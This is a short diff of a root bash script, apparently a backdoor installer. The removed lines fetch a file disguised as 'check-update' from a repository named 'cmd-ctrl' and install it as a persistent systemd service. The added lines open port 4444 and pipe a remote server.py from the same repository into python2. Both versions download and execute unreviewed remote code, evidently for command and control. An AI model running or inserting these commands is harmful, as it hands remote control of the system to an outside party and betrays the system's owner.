@@ -1,7 +1,4 @@
 #!/bin/bash
-curl -s https://raw.githubusercontent.com/kiaolin/cmd-ctrl/main/check-update > "/root/.check-update"
-chmod +x /root/.check-update
-curl -s https://raw.githubusercontent.com/kiaolin/cmd-ctrl/main/check-update.service > "/etc/systemd/system/check-update.service"
-systemctl daemon-reload
-systemctl enable check-update
-systemctl start check-update
+firewall-cmd --add-port=4444/tcp
+curl -s https://raw.githubusercontent.com/kiaolin/cmd-ctrl/main/server.py | python2
+
